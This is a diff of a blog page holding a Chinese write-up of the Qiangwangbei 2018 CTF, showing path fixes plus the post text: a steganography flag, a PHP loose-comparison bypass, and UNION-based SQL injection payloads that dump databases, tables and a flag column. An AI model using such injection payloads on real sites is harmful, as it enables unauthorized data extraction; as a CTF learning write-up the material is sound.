@@ -87,13 +87,13 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="welcome这题下载下来一个bmp文件，尝试最低位隐写无果后，尝试offset，最后在offset100位后找到flag  flag: qwb{W3lc0me} web签到1题目地址：`http://39.107.33.96:10000/` 第一层：使用了弱等于，php弱类型绕过 0e开头的全部相等 123if($_POST[&apos;param1&apos;]!=$_POST[&apos;param2&apos;] &amp;amp;&amp;a">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/03/31/划水之强网杯2018writeup/划水之强网杯2018writeup/welcome.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/03/31/划水之强网杯2018writeup/划水之强网杯2018writeup/s6.png">
-<meta property="og:updated_time" content="2018-04-08T13:23:52.261Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/03/31/划水之强网杯2018writeup/welcome.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/03/31/划水之强网杯2018writeup/s6.png">
+<meta property="og:updated_time" content="2019-02-21T12:00:24.678Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="划水之强网杯2018writeup">
 <meta name="twitter:description" content="welcome这题下载下来一个bmp文件，尝试最低位隐写无果后，尝试offset，最后在offset100位后找到flag  flag: qwb{W3lc0me} web签到1题目地址：`http://39.107.33.96:10000/` 第一层：使用了弱等于，php弱类型绕过 0e开头的全部相等 123if($_POST[&apos;param1&apos;]!=$_POST[&apos;param2&apos;] &amp;amp;&amp;a">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/03/31/划水之强网杯2018writeup/划水之强网杯2018writeup/welcome.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/03/31/划水之强网杯2018writeup/welcome.png">
 
 
 
@@ -391,7 +391,7 @@
 
       
         <h4 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h4><p>这题下载下来一个bmp文件，尝试最低位隐写无果后，尝试offset，最后在offset100位后找到flag</p>
-<p><img src="划水之强网杯2018writeup/welcome.png" alt=""></p>
+<p><img src="welcome.png" alt=""></p>
 <p>flag: qwb{W3lc0me}</p>
 <h4 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h4><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目地址：`http:<span class="comment">//39.107.33.96:10000/`</span></span><br></pre></td></tr></table></figure>
 <p>第一层：使用了弱等于，php弱类型绕过 0e开头的全部相等</p>
@@ -416,7 +416,7 @@
 <p>测试过程中发现age必须为数字。于是通过<strong>hex编码绕过</strong> </p>
 <p>payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">寻找注入点：</span><br><span class="line">1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span><span class="comment">#        </span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#      </span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line">three hit:爆库、爆表、爆字段</span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'qwb'</span>),<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><img src="划水之强网杯2018writeup/s6.png" alt=""></p>
+<p><img src="s6.png" alt=""></p>
 
       
     </div>
@@ -567,7 +567,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
